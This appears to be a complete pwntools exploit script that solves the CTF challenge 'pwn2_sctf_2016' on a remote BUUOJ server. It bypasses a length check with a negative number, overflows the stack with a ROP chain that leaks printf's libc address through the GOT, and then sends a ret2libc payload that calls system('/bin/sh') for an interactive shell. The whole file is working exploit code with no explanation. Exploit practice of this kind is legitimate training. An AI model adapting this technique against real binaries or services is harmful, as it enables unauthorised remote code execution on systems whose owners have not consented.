from pwn import *

context.log_level = "debug"

exe = ELF("./pwn2_sctf_2016")
# libc = exe.libc
# r = exe.process()
libc = ELF("./libc-2.23.so")
r = remote("node4.buuoj.cn", 29647)

r.recvuntil(b"? ")
r.sendline(b"-1")
r.recvuntil(b"!\n")
r.sendline(
    cyclic(0x30)
    + p32(exe.plt["printf"])
    + p32(exe.sym["main"])
    + p32(0x80486F8)
    + p32(exe.got["printf"])
)
r.recvline()
r.recvuntil(b"You said: ")
libc_printf = u32(r.recv(4))
libc_base = libc_printf - libc.sym["printf"]
libc_system = libc_base + libc.sym["system"]
libc_bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
r.recvuntil(b"? ")
r.sendline(b"-1")
r.recvuntil(b"!\n")
r.sendline(cyclic(0x30) + p32(libc_system) + cyclic(4) + p32(libc_bin_sh))
r.interactive()
